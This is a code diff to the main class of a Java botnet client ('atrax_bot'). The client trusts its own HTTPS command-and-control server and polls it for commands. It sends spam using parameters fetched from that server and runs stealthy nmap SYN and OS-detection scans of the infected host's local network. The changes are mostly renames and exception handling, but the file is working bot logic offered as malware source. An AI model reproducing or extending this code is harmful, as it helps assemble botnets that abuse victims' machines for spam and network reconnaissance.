@@ -1,8 +1,13 @@
 
 package atrax_bot;
+import java.io.IOException;
+import java.io.UnsupportedEncodingException;
 import java.net.InetAddress;
 import java.net.UnknownHostException;
+import java.security.NoSuchAlgorithmException;
 import java.util.Iterator;
+import javax.xml.parsers.ParserConfigurationException;
+import org.xml.sax.SAXException;
 
 public class bot_actions {
 
@@ -11,7 +16,7 @@ public class bot_actions {
  */
     public enum ccResponses { start, sleep, noResponse, spam, scan };
     
-    public static void main(String[] args) {
+    public static void main(String[] args) throws IOException, UnsupportedEncodingException, NoSuchAlgorithmException, SAXException, ParserConfigurationException {
         
         /************************
          * BOT IN INIT MODE 
@@ -38,7 +43,7 @@ public class bot_actions {
         
         // SSL cert trust setup
         // on my https server
-        new CC_connector().setupTrust();
+        new CC_Connector().setupTrust();
         
         // INTERACTION BETWEEN BOT AND C&C
         // using reports
@@ -72,7 +77,7 @@ public class bot_actions {
             }
             
             if (!botRunning) {
-                Tools.sleep(theBot.checkCommandTime, theBot.checkCommandTimeRandom, debug);
+                tools.sleep(theBot.checkCommandTime, theBot.checkCommandTimeRandom, debug);
                 
             }
         }
@@ -103,8 +108,6 @@ public class bot_actions {
                         theBot.publicIpAddr + "."
                         );
             } catch(UnknownHostException e) {
-                // exception catcher
-                e.printStackTrace();
             }
         }
         
@@ -116,7 +119,7 @@ public class bot_actions {
         
         if(debug) System.out.println("Starting listening thread...");
         
-        NICListener listenerThread = new NICListener();
+        theListener listenerThread = new theListener();
         
         listenerThread.start();
         
@@ -140,7 +143,7 @@ public class bot_actions {
                  **************************/
                 case spam:
                     if(debug) System.out.println("Received spam command. Requesting spam parameters...");
-                    Mailer theMailer = new Mailer(theBot);
+                    mailer theMailer = new mailer(theBot);
                     theBot.status = "spam";
                     
                     // get spam parameters from the CC
@@ -148,7 +151,7 @@ public class bot_actions {
                     
                     if (CC_Reply != null && CC_Reply.contains("<spam>")) {
                         if(debug) System.out.println("SENDING SPAM!!");
-                        SpamModule.send(CC_Reply, theMailer, debug);
+                        spamModule.sendSpam(CC_Reply, theMailer, debug);
                         
                         // return back to command mode
                         theBot.status = "command";
@@ -176,17 +179,17 @@ public class bot_actions {
                     // the nmap scanning command passed in 
                     // nmap -sS -O 
                     String nmapCommand = "nmap -sS -O " +
-                            theBot.hostNetParams.primaryInterfaceNetwork
+                            theBot.hostNetParams.mainInterfaceNetwork
                             .toString().replace("/", "") +
                             HostNetParams.toCIDR(theBot.hostNetParams
-                            .primaryInterfaceSubnetMask);
+                            .mainInterfaceSubnetMask);
                     if(debug) {
                         System.out.println("Currently using this command:" + 
                                 nmapCommand);
                     }
                     
                     // restart the TCP listening thread
-                    synchronized(listenerTHread) {
+                    synchronized(listenerThread) {
                         listenerThread.pleaseWait = false;
                     }
                     
@@ -199,7 +202,7 @@ public class bot_actions {
                     
                 case sleep:
                     if(debug) System.out.println("Received sleep command.");
-                    Tools.sleep(theBot.checkCommandTime, theBot.checkCommandTimeRandom, debug);
+                    tools.sleep(theBot.checkCommandTime, theBot.checkCommandTimeRandom, debug);
                     break;
                 
                 default:
